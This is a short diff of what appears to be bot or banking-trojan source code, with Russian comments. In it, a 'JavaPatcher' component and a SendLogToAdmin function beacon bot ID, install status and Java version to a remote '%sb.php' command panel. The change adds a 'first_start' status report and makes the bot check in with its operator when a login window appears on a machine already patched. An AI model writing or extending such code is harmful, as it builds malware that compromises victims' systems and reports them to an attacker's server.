@@ -199,7 +199,13 @@ static void SendLogToAdmin( int num )
 {
 	char qr[128];
 	fwsprintfA pwsprintfA = Get_wsprintfA();
-	pwsprintfA( qr, "%sb.php?uid=%s&c=setup_patch&v=%d&jv=%d_%d&botver=%s", domain, BOT_UID, num, javaVersion2, javaBuild, versionPatch  );
+	const char* c = "setup_patch";
+	if( num >= 100 ) 
+	{
+		c = "first_start";
+		num -= 100;
+	}
+	pwsprintfA( qr, "%sb.php?uid=%s&c=%s&v=%d&jv=%d_%d&botver=%s", domain, BOT_UID, c, num, javaVersion2, javaBuild, versionPatch  );
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
@@ -1187,11 +1193,14 @@ void JavaPatcherAddPidToFile()
 // Функция сигнализирует о необходимости запуска патчей
 DWORD WINAPI JavaPatcherSignal(LPVOID lpData)
 {
-
-	if( JavaPatchInstalled() ) return 0; //если патч установлен, то не нужно его повторно ставить
-
 	InitData();
 	GetJavaVersion();
+	if( JavaPatchInstalled() ) //если патч установлен, то не нужно его повторно ставить
+	{
+		SendLogToAdmin(101); //сообщаем при появлении окна ввода логина, что патч установлен
+		return 0; 
+	}
+
 	StartThread( SendJavaPatchSetupPatch, 0 );
 
 	JavaPatcherAddPidToFile();
